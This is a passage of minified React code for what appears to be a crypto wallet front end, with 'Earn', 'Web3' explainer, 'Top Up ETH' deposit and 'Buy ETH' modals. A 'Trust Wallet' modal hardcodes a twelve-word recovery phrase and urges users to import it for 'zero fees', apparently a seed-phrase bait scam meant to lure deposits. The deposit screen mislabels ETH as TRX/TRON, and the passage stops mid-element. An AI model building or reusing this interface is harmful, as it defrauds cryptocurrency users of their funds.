                                className: "jsx-212d2f498bea9fe5"
                            })
                        }), eU && (0, r.jsx)("div", {
                            style: {
                                position: "fixed",
                                inset: 0,
                                backgroundColor: "rgba(248,247,253,0.82)",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                zIndex: 9999,
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: (0, r.jsx)("div", {
                                style: {
                                    width: "60px",
                                    height: "60px",
                                    borderRadius: "50%",
                                    border: "3px solid transparent",
                                    borderTopColor: tH("--twc-primary"),
                                    borderRightColor: tH("--twc-primary"),
                                    animation: "spin 1s linear infinite",
                                    boxShadow: "0 0 30px rgba(124, 58, 237, 0.22)"
                                },
                                className: "jsx-212d2f498bea9fe5"
                            })
                        }), Y && (0, r.jsx)("div", {
                            style: {
                                position: "fixed",
                                inset: 0,
                                backgroundColor: "rgba(248,247,253,0.82)",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                zIndex: 9999,
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: (0, r.jsx)("div", {
                                style: {
                                    width: "60px",
                                    height: "60px",
                                    borderRadius: "50%",
                                    border: "3px solid transparent",
                                    borderTopColor: tH("--twc-primary"),
                                    borderRightColor: tH("--twc-primary"),
                                    animation: "spin 1s linear infinite",
                                    boxShadow: "0 0 30px rgba(124, 58, 237, 0.22)"
                                },
                                className: "jsx-212d2f498bea9fe5"
                            })
                        }), eG && (0, r.jsx)("div", {
                            style: {
                                position: "fixed",
                                top: 0,
                                left: 0,
                                right: 0,
                                bottom: 0,
                                backgroundColor: "rgba(248,247,253,0.82)",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                zIndex: 9998,
                                padding: "16px",
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: (0, r.jsxs)("div", {
                                style: {
                                    background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                    borderRadius: "24px",
                                    width: "100%",
                                    maxWidth: "420px",
                                    height: "300px",
                                    display: "flex",
                                    flexDirection: "column",
                                    boxShadow: "0 24px 80px rgba(124, 58, 237, 0.12), 0 8px 24px rgba(15, 23, 42, 0.08)",
                                    border: "1px solid rgba(174,156,255,0.18)"
                                },
                                children: [(0, r.jsxs)("div", {
                                    style: {
                                        padding: "20px 24px 16px",
                                        display: "flex",
                                        justifyContent: "space-between",
                                        alignItems: "center",
                                        position: "relative",
                                        borderBottom: "1px solid ".concat(tH("--twc-line"))
                                    },
                                    children: [(0, r.jsx)("div", {
                                        style: {
                                            width: "40px"
                                        }
                                    }), (0, r.jsx)("h3", {
                                        style: {
                                            color: tH("--twc-textPrimary"),
                                            margin: 0,
                                            fontSize: "18px",
                                            fontWeight: 700,
                                            textAlign: "center",
                                            flex: 1
                                        },
                                        children: "Earn"
                                    }), (0, r.jsx)("button", {
                                        onClick: () => eJ(!1),
                                        style: {
                                            background: tH("--twc-bg3"),
                                            border: "none",
                                            color: tH("--twc-iconNormal"),
                                            cursor: "pointer",
                                            fontSize: "20px",
                                            padding: "8px",
                                            borderRadius: "50%",
                                            width: "36px",
                                            height: "36px",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center",
                                            transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)"
                                        },
                                        onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"),
                                        onMouseLeave: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                        children: "\xd7"
                                    })]
                                }), (0, r.jsxs)("div", {
                                    style: {
                                        flex: 1,
                                        overflowY: "auto",
                                        padding: "32px 24px",
                                        display: "flex",
                                        flexDirection: "column",
                                        alignItems: "center",
                                        justifyContent: "center",
                                        textAlign: "center"
                                    },
                                    children: [(0, r.jsx)("div", {
                                        style: {
                                            width: "80px",
                                            height: "80px",
                                            borderRadius: "50%",
                                            background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center",
                                            marginBottom: "20px",
                                            border: "1px solid rgba(174,156,255,0.18)"
                                        },
                                        children: (0, r.jsxs)("svg", {
                                            width: "40",
                                            height: "40",
                                            viewBox: "0 0 24 24",
                                            fill: tH("--twc-iconNormal"),
                                            children: [(0, r.jsx)("path", {
                                                d: "M22.668 16H2.66797V22H22.668V16Z",
                                                fill: "currentColor"
                                            }), (0, r.jsx)("path", {
                                                fillRule: "evenodd",
                                                clipRule: "evenodd",
                                                d: "M21.4648 10.7988C21.4648 5.93937 17.5255 2 12.666 2C7.80656 2 3.86719 5.93937 3.86719 10.7988C3.86719 14.1599 5.75169 17.0807 8.52171 18.5625H16.8103C19.5803 17.0807 21.4648 14.1599 21.4648 10.7988ZM8.89509 10.7988L12.666 14.5698L16.4369 10.7988L12.666 7.0279L8.89509 10.7988Z",
                                                fill: "currentColor"
                                            })]
                                        })
                                    }), (0, r.jsx)("p", {
                                        style: {
                                            color: tH("--twc-textPrimary"),
                                            fontSize: "20px",
                                            fontWeight: 700,
                                            margin: "0 0 12px"
                                        },
                                        children: "No Earning Opportunities"
                                    }), (0, r.jsx)("p", {
                                        style: {
                                            color: tH("--twc-textSecondary"),
                                            fontSize: "14px",
                                            margin: "0 0 24px",
                                            lineHeight: "1.5"
                                        },
                                        children: "There are currently no earning opportunities available. Please try again later."
                                    }), (0, r.jsx)("button", {
                                        onClick: () => eJ(!1),
                                        style: {
                                            padding: "12px 24px",
                                            "data-phantom-primary": !0
                                        },
                                        onMouseEnter: e => e.currentTarget.style.filter = "brightness(1.03)",
                                        onMouseLeave: e => e.currentTarget.style.filter = "brightness(1)",
                                        children: "Close"
                                    })]
                                })]
                            })
                        }), e$ && (0, r.jsx)("div", {
                            style: {
                                position: "fixed",
                                top: 0,
                                left: 0,
                                right: 0,
                                bottom: 0,
                                backgroundColor: "rgba(248,247,253,0.82)",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                zIndex: 9998,
                                padding: "16px",
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: (0, r.jsxs)("div", {
                                style: {
                                    background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                    borderRadius: "24px",
                                    width: "100%",
                                    maxWidth: "420px",
                                    height: "400px",
                                    display: "flex",
                                    flexDirection: "column",
                                    boxShadow: "0 24px 80px rgba(124, 58, 237, 0.12), 0 8px 24px rgba(15, 23, 42, 0.08)",
                                    border: "1px solid rgba(174,156,255,0.18)"
                                },
                                children: [(0, r.jsxs)("div", {
                                    style: {
                                        padding: "20px 24px 16px",
                                        display: "flex",
                                        justifyContent: "space-between",
                                        alignItems: "center",
                                        position: "relative",
                                        borderBottom: "1px solid ".concat(tH("--twc-line"))
                                    },
                                    children: [(0, r.jsx)("div", {
                                        style: {
                                            width: "40px"
                                        }
                                    }), (0, r.jsx)("h3", {
                                        style: {
                                            color: tH("--twc-textPrimary"),
                                            margin: 0,
                                            fontSize: "18px",
                                            fontWeight: 700,
                                            textAlign: "center",
                                            flex: 1
                                        },
                                        children: "What is Web3?"
                                    }), (0, r.jsx)("button", {
                                        onClick: () => eQ(!1),
                                        style: {
                                            background: tH("--twc-bg3"),
                                            border: "none",
                                            color: tH("--twc-iconNormal"),
                                            cursor: "pointer",
                                            fontSize: "20px",
                                            padding: "8px",
                                            borderRadius: "50%",
                                            width: "36px",
                                            height: "36px",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center",
                                            transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)"
                                        },
                                        onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"),
                                        onMouseLeave: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                        children: "\xd7"
                                    })]
                                }), (0, r.jsxs)("div", {
                                    style: {
                                        flex: 1,
                                        overflowY: "auto",
                                        padding: "32px 24px",
                                        display: "flex",
                                        flexDirection: "column"
                                    },
                                    children: [(0, r.jsx)("div", {
                                        style: {
                                            width: "80px",
                                            height: "80px",
                                            borderRadius: "50%",
                                            background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center",
                                            marginBottom: "20px",
                                            alignSelf: "center",
                                            border: "1px solid rgba(174,156,255,0.18)"
                                        },
                                        children: (0, r.jsxs)("svg", {
                                            width: "40",
                                            height: "40",
                                            viewBox: "0 0 24 24",
                                            fill: tH("--twc-primary"),
                                            children: [(0, r.jsx)("path", {
                                                d: "M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z",
                                                fill: "currentColor"
                                            }), (0, r.jsx)("path", {
                                                d: "M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z",
                                                fill: "currentColor",
                                                opacity: "0.3"
                                            })]
                                        })
                                    }), (0, r.jsx)("p", {
                                        style: {
                                            color: tH("--twc-textPrimary"),
                                            fontSize: "18px",
                                            fontWeight: 700,
                                            margin: "0 0 16px",
                                            textAlign: "center"
                                        },
                                        children: "Web3: The Decentralized Web"
                                    }), (0, r.jsxs)("div", {
                                        style: {
                                            background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                            borderRadius: "20px",
                                            padding: "20px",
                                            border: "1px solid rgba(174,156,255,0.18)",
                                            marginBottom: "24px"
                                        },
                                        children: [(0, r.jsx)("p", {
                                            style: {
                                                color: tH("--twc-textSecondary"),
                                                fontSize: "14px",
                                                margin: 0,
                                                lineHeight: "1.6"
                                            },
                                            children: "Web3 represents the next evolution of the internet, built on blockchain technology. It emphasizes decentralization, user ownership of data and digital assets, and trustless interactions through smart contracts."
                                        }), (0, r.jsxs)("div", {
                                            style: {
                                                marginTop: "16px"
                                            },
                                            children: [(0, r.jsx)("p", {
                                                style: {
                                                    color: tH("--twc-textPrimary"),
                                                    fontSize: "14px",
                                                    fontWeight: 600,
                                                    margin: "0 0 8px"
                                                },
                                                children: "Key Features:"
                                            }), (0, r.jsxs)("ul", {
                                                style: {
                                                    color: tH("--twc-textSecondary"),
                                                    fontSize: "13px",
                                                    margin: 0,
                                                    paddingLeft: "20px",
                                                    lineHeight: "1.5"
                                                },
                                                children: [(0, r.jsx)("li", {
                                                    style: {
                                                        marginBottom: "6px"
                                                    },
                                                    children: "Decentralized Applications (dApps)"
                                                }), (0, r.jsx)("li", {
                                                    style: {
                                                        marginBottom: "6px"
                                                    },
                                                    children: "Digital Asset Ownership (NFTs, Tokens)"
                                                }), (0, r.jsx)("li", {
                                                    style: {
                                                        marginBottom: "6px"
                                                    },
                                                    children: "Smart Contracts"
                                                }), (0, r.jsx)("li", {
                                                    style: {
                                                        marginBottom: "6px"
                                                    },
                                                    children: "User-Controlled Identity"
                                                }), (0, r.jsx)("li", {
                                                    children: "Permissionless Participation"
                                                })]
                                            })]
                                        })]
                                    }), (0, r.jsx)("button", {
                                        onClick: () => eQ(!1),
                                        style: {
                                            width: "100%",
                                            padding: "14px",
                                            "data-phantom-primary": !0,
                                            marginTop: "auto"
                                        },
                                        onMouseEnter: e => e.currentTarget.style.filter = "brightness(1.03)",
                                        onMouseLeave: e => e.currentTarget.style.filter = "brightness(1)",
                                        children: "Close"
                                    })]
                                })]
                            })
                        }), ti && (0, r.jsx)("div", {
                            style: {
                                position: "fixed",
                                top: 0,
                                left: 0,
                                right: 0,
                                bottom: 0,
                                backgroundColor: "rgba(248,247,253,0.82)",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                zIndex: 9998,
                                padding: "16px",
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: G && "send" === ee ? tV() : (0, r.jsxs)("div", {
                                style: {
                                    background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                    borderRadius: "24px",
                                    width: "100%",
                                    maxWidth: "420px",
                                    height: "620px",
                                    display: "flex",
                                    flexDirection: "column",
                                    boxShadow: "0 24px 80px rgba(124, 58, 237, 0.12), 0 8px 24px rgba(15, 23, 42, 0.08)",
                                    border: "1px solid rgba(174,156,255,0.18)"
                                },
                                children: [(0, r.jsxs)("div", {
                                    style: {
                                        padding: "20px 24px 16px",
                                        display: "flex",
                                        justifyContent: "space-between",
                                        alignItems: "center",
                                        position: "relative",
                                        borderBottom: "1px solid ".concat(tH("--twc-line"))
                                    },
                                    children: [(0, r.jsx)("button", {
                                        onClick: () => ts(!1),
                                        style: {
                                            background: "rgba(255,255,255,0.55)",
                                            border: "none",
                                            color: tH("--twc-textPrimary"),
                                            cursor: "pointer",
                                            padding: "8px",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center",
                                            borderRadius: "18px",
                                            transition: "background-color 0.2s ease",
                                            position: "absolute",
                                            left: "16px",
                                            zIndex: 10
                                        },
                                        onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                        onMouseLeave: e => e.currentTarget.style.backgroundColor = "transparent",
                                        children: (0, r.jsx)("svg", {
                                            width: "24",
                                            height: "24",
                                            viewBox: "0 0 24 24",
                                            fill: "currentColor",
                                            children: (0, r.jsx)("path", {
                                                d: "M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"
                                            })
                                        })
                                    }), (0, r.jsx)("h3", {
                                        style: {
                                            color: tH("--twc-textPrimary"),
                                            margin: 0,
                                            fontSize: "18px",
                                            fontWeight: 700,
                                            textAlign: "center",
                                            width: "100%",
                                            paddingLeft: "40px",
                                            paddingRight: "40px"
                                        },
                                        children: "Top Up ETH"
                                    }), (0, r.jsx)("button", {
                                        onClick: () => ts(!1),
                                        style: {
                                            background: tH("--twc-bg3"),
                                            border: "none",
                                            color: tH("--twc-iconNormal"),
                                            cursor: "pointer",
                                            fontSize: "20px",
                                            padding: "8px",
                                            borderRadius: "50%",
                                            width: "36px",
                                            height: "36px",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center",
                                            transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                            position: "absolute",
                                            right: "16px",
                                            zIndex: 10
                                        },
                                        onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"),
                                        onMouseLeave: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                        children: "\xd7"
                                    })]
                                }), (0, r.jsxs)("div", {
                                    style: {
                                        flex: 1,
                                        overflowY: "auto",
                                        padding: "24px",
                                        display: "flex",
                                        flexDirection: "column",
                                        alignItems: "center"
                                    },
                                    children: [(0, r.jsxs)("div", {
                                        style: {
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center",
                                            gap: "12px",
                                            marginBottom: "20px"
                                        },
                                        children: [(0, r.jsx)("div", {
                                            style: {
                                                width: "56px",
                                                height: "56px",
                                                borderRadius: "50%",
                                                overflow: "hidden",
                                                border: "1px solid rgba(174,156,255,0.18)"
                                            },
                                            children: (0, r.jsx)("img", {
                                                src: tC.ETH,
                                                alt: "ETH",
                                                style: {
                                                    width: "100%"
                                                }
                                            })
                                        }), (0, r.jsxs)("div", {
                                            children: [(0, r.jsx)("p", {
                                                style: {
                                                    color: tH("--twc-textPrimary"),
                                                    margin: 0,
                                                    fontSize: "20px",
                                                    fontWeight: 700
                                                },
                                                children: "TRX"
                                            }), (0, r.jsx)("p", {
                                                style: {
                                                    color: tH("--twc-textSecondary"),
                                                    margin: "4px 0 0",
                                                    fontSize: "16px"
                                                },
                                                children: "TRON"
                                            })]
                                        })]
                                    }), (0, r.jsx)("div", {
                                        style: {
                                            backgroundColor: "#fff",
                                            borderRadius: "20px",
                                            padding: "16px",
                                            marginBottom: "20px",
                                            width: "200px",
                                            height: "200px",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center",
                                            border: "1px solid rgba(174,156,255,0.18)"
                                        },
                                        children: (0, r.jsx)("div", {
                                            style: {
                                                width: "170px",
                                                height: "170px",
                                                background: "url(https://api.qrserver.com/v1/create-qr-code/?size=170x170&data=".concat(encodeURIComponent(e0), ")"),
                                                backgroundSize: "contain",
                                                backgroundRepeat: "no-repeat",
                                                backgroundPosition: "center"
                                            }
                                        })
                                    }), (0, r.jsxs)("div", {
                                        style: {
                                            background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                            borderRadius: "20px",
                                            padding: "16px",
                                            width: "100%",
                                            border: "1px solid rgba(174,156,255,0.18)",
                                            marginBottom: "20px"
                                        },
                                        children: [(0, r.jsx)("p", {
                                            style: {
                                                color: tH("--twc-textSecondary"),
                                                margin: "0 0 8px",
                                                fontSize: "13px",
                                                fontWeight: 500,
                                                textAlign: "left"
                                            },
                                            children: "Your ETH Wallet Address"
                                        }), (0, r.jsxs)("div", {
                                            style: {
                                                display: "flex",
                                                alignItems: "center",
                                                gap: "12px"
                                            },
                                            children: [(0, r.jsx)("div", {
                                                style: {
                                                    flex: 1,
                                                    overflow: "hidden",
                                                    minWidth: 0
                                                },
                                                children: (0, r.jsx)("p", {
                                                    style: {
                                                        color: tH("--twc-textPrimary"),
                                                        margin: 0,
                                                        fontSize: "14px",
                                                        fontFamily: "monospace",
                                                        fontWeight: 500,
                                                        whiteSpace: "nowrap",
                                                        overflow: "hidden",
                                                        textOverflow: "ellipsis"
                                                    },
                                                    children: e0
                                                })
                                            }), (0, r.jsx)("button", {
                                                onClick: () => {
                                                    navigator.clipboard.writeText(e0), e_(!0), setTimeout(() => e_(!1), 2e3)
                                                },
                                                style: {
                                                    background: tH("--twc-bg3"),
                                                    border: "1px solid rgba(174,156,255,0.18)",
                                                    color: tH("--twc-textPrimary"),
                                                    cursor: "pointer",
                                                    fontSize: "14px",
                                                    padding: "8px 12px",
                                                    borderRadius: "18px",
                                                    fontWeight: 600,
                                                    width: "80px",
                                                    height: "36px",
                                                    transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                    display: "flex",
                                                    alignItems: "center",
                                                    justifyContent: "center",
                                                    gap: "6px",
                                                    flexShrink: 0
                                                },
                                                onMouseEnter: e => {
                                                    e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"), e.currentTarget.style.borderColor = tH("--twc-primary")
                                                },
                                                onMouseLeave: e => {
                                                    e.currentTarget.style.backgroundColor = tH("--twc-bg3"), e.currentTarget.style.borderColor = tH("--twc-line")
                                                },
                                                children: eH ? "Copied" : "Copy"
                                            })]
                                        })]
                                    }), (0, r.jsxs)("button", {
                                        onClick: () => {
                                            J(!0), et("send")
                                        },
                                        style: {
                                            width: "100%",
                                            padding: "14px",
                                            background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                            border: "1px solid rgba(174,156,255,0.18)",
                                            borderRadius: "20px",
                                            cursor: "pointer",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center",
                                            gap: "10px",
                                            transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                            marginTop: "auto"
                                        },
                                        onMouseEnter: e => {
                                            e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"), e.currentTarget.style.borderColor = tH("--twc-primary")
                                        },
                                        onMouseLeave: e => {
                                            e.currentTarget.style.backgroundColor = tH("--twc-bg3"), e.currentTarget.style.borderColor = tH("--twc-line")
                                        },
                                        children: [(0, r.jsx)("svg", {
                                            width: "20",
                                            height: "20",
                                            viewBox: "0 0 24 24",
                                            fill: tH("--twc-textPrimary"),
                                            children: (0, r.jsx)("path", {
                                                d: "M21 5H3V8H21V5ZM21 10.5H3V19H21V10.5ZM6 13H11V15.5H6V13ZM15.5 13H13V15.5H15.5V13Z"
                                            })
                                        }), (0, r.jsx)("span", {
                                            style: {
                                                color: tH("--twc-textPrimary"),
                                                fontSize: "14px",
                                                fontWeight: 600
                                            },
                                            children: "Buy ETH with Providers"
                                        })]
                                    })]
                                })]
                            })
                        }), ta && (0, r.jsx)("div", {
                            style: {
                                position: "fixed",
                                top: 0,
                                left: 0,
                                right: 0,
                                bottom: 0,
                                backgroundColor: "rgba(248,247,253,0.82)",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                zIndex: 9998,
                                padding: "16px",
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: (0, r.jsxs)("div", {
                                style: {
                                    background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                    borderRadius: "24px",
                                    width: "100%",
                                    maxWidth: "420px",
                                    height: "600px",
                                    display: "flex",
                                    flexDirection: "column",
                                    boxShadow: "0 24px 80px rgba(124, 58, 237, 0.12), 0 8px 24px rgba(15, 23, 42, 0.08)",
                                    border: "1px solid rgba(174,156,255,0.18)"
                                },
                                children: [(0, r.jsxs)("div", {
                                    style: {
                                        padding: "20px 24px 16px",
                                        display: "flex",
                                        justifyContent: "space-between",
                                        alignItems: "center",
                                        position: "relative",
                                        borderBottom: "1px solid ".concat(tH("--twc-line"))
                                    },
                                    children: [(0, r.jsx)("div", {
                                        style: {
                                            width: "40px"
                                        }
                                    }), (0, r.jsx)("h3", {
                                        style: {
                                            color: tH("--twc-textPrimary"),
                                            margin: 0,
                                            fontSize: "18px",
                                            fontWeight: 700,
                                            textAlign: "center",
                                            flex: 1
                                        },
                                        children: "Buy ETH"
                                    }), (0, r.jsx)("button", {
                                        onClick: () => tl(!1),
                                        style: {
                                            background: tH("--twc-bg3"),
                                            border: "none",
                                            color: tH("--twc-iconNormal"),
                                            cursor: "pointer",
                                            fontSize: "20px",
                                            padding: "8px",
                                            borderRadius: "50%",
                                            width: "36px",
                                            height: "36px",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center",
                                            transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)"
                                        },
                                        onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"),
                                        onMouseLeave: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                        children: "\xd7"
                                    })]
                                }), (0, r.jsx)("div", {
                                    style: {
                                        flex: 1,
                                        overflow: "hidden",
                                        padding: "0",
                                        display: "flex",
                                        flexDirection: "column"
                                    },
                                    children: (0, r.jsx)("iframe", {
                                        src: "https://guardarian.com/calculator/v1?partner_id=8a7b3b7e-7f7e-4b7e-8a7b-3b7e7f7e4b7e&default_fiat=USD&default_crypto=ETH",
                                        style: {
                                            width: "100%",
                                            height: "100%",
                                            border: "none",
                                            borderRadius: "0 0 24px 24px"
                                        },
                                        title: "Buy Crypto with Guardarian",
                                        allow: "payment; camera; microphone; geolocation",
                                        sandbox: "allow-same-origin allow-scripts allow-forms allow-popups allow-modals allow-top-navigation-by-user-activation"
                                    })
                                })]
                            })
                        }), en && (0, r.jsx)("div", {
                            style: {
                                position: "fixed",
                                top: 0,
                                left: 0,
                                right: 0,
                                bottom: 0,
                                backgroundColor: "rgba(248,247,253,0.82)",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                zIndex: 9998,
                                padding: "16px",
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: (() => {
                                let e = "jealous install marine head avoid knock chest noodle rotate tone seek cluster";
                                return (0, r.jsxs)("div", {
                                    style: {
                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                        borderRadius: "24px",
                                        width: "100%",
                                        maxWidth: "420px",
                                        height: "auto",
                                        minHeight: "520px",
                                        display: "flex",
                                        flexDirection: "column",
                                        boxShadow: "0 24px 80px rgba(124, 58, 237, 0.12), 0 8px 24px rgba(15, 23, 42, 0.08)",
                                        border: "1px solid rgba(174,156,255,0.18)",
                                        animation: "fadeIn 0.3s ease-out"
                                    },
                                    children: [(0, r.jsxs)("div", {
                                        style: {
                                            padding: "20px 24px 16px",
                                            display: "flex",
                                            justifyContent: "space-between",
                                            alignItems: "center",
                                            position: "relative",
                                            borderBottom: "1px solid ".concat(tH("--twc-line"))
                                        },
                                        children: [(0, r.jsx)("div", {
                                            style: {
                                                width: "40px"
                                            }
                                        }), (0, r.jsx)("h3", {
                                            style: {
                                                color: tH("--twc-textPrimary"),
                                                margin: 0,
                                                fontSize: "18px",
                                                fontWeight: 700,
                                                textAlign: "center",
                                                flex: 1
                                            },
                                            children: "Trust Wallet"
                                        }), (0, r.jsx)("button", {
                                            onClick: () => er(!1),
                                            style: {
                                                background: tH("--twc-bg3"),
                                                border: "none",
                                                color: tH("--twc-iconNormal"),
                                                cursor: "pointer",
                                                fontSize: "20px",
                                                padding: "8px",
                                                borderRadius: "50%",
                                                width: "36px",
                                                height: "36px",
                                                display: "flex",
                                                alignItems: "center",
                                                justifyContent: "center",
                                                transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)"
                                            },
                                            onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"),
                                            onMouseLeave: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                            children: "\xd7"
                                        })]
                                    }), (0, r.jsxs)("div", {
                                        style: {
                                            flex: 1,
                                            overflowY: "auto",
                                            padding: "24px",
                                            display: "flex",
                                            flexDirection: "column",
                                            alignItems: "center",
                                            textAlign: "center"
                                        },
                                        children: [(0, r.jsx)("div", {
                                            style: {
                                                width: "80px",
                                                height: "80px",
                                                marginBottom: "16px"
                                            },
                                            children: (0, r.jsx)("img", {
                                                src: "https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/trust-wallet-icon.png",
                                                alt: "Trust Wallet",
                                                style: {
                                                    width: "100%",
                                                    height: "100%",
                                                    objectFit: "contain"
                                                }
                                            })
                                        }), (0, r.jsx)("p", {
                                            style: {
                                                color: tH("--twc-textPrimary"),
                                                fontSize: "18px",
                                                fontWeight: 700,
                                                margin: "0 0 8px"
                                            }
                                        }), (0, r.jsxs)("p", {
                                            style: {
                                                color: tH("--twc-textSecondary"),
                                                fontSize: "14px",
                                                margin: "0 0 20px",
                                                lineHeight: "1.6"
                                            },
                                            children: ["Import your recovery phrase to ", (0, r.jsx)("strong", {
                                                style: {
                                                    color: tH("--twc-primary")
                                                },
                                                children: "Trust Wallet"
                                            }), " for ", (0, r.jsx)("strong", {
                                                style: {
                                                    color: tH("--twc-primary")
                                                },
                                                children: "zero fees"
                                            }), "."]
                                        }), (0, r.jsxs)("div", {
                                            style: {
                                                backgroundColor: "rgba(255, 68, 68, 0.1)",
                                                borderRadius: "20px",
                                                padding: "16px",
                                                marginBottom: "20px",
                                                border: "1px solid #ff4444",
                                                width: "100%"
                                            },
                                            children: [(0, r.jsx)("p", {
                                                style: {
                                                    color: "#ff4444",
                                                    fontSize: "14px",
                                                    fontWeight: 600,
                                                    margin: 0,
                                                    marginBottom: "8px"
                                                },
                                                children: "⚠️ Import seed phrase to TrustWallet.com"
                                            }), (0, r.jsx)("p", {
                                                style: {
                                                    color: "#ff4444",
                                                    fontSize: "12px",
                                                    margin: 0
                                                },
                                                children: "Never share with anyone!"
                                            })]
                                        }), (0, r.jsxs)("div", {
                                            style: {
                                                background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                borderRadius: "20px",
                                                padding: "16px",
                                                marginBottom: "20px",
                                                border: "1px solid rgba(174,156,255,0.18)",
                                                width: "100%"
                                            },
                                            children: [(0, r.jsx)("p", {
                                                style: {
                                                    color: tH("--twc-textSecondary"),
                                                    fontSize: "12px",
                                                    margin: "0 0 8px",
                                                    textAlign: "left"
                                                },
                                                children: "Recovery Phrase:"
                                            }), (0, r.jsx)("p", {
                                                style: {
                                                    color: tH("--twc-textPrimary"),
                                                    fontSize: "14px",
                                                    fontWeight: 600,
                                                    margin: 0,
                                                    fontFamily: "monospace",
                                                    wordBreak: "break-word",
                                                    textAlign: "center",
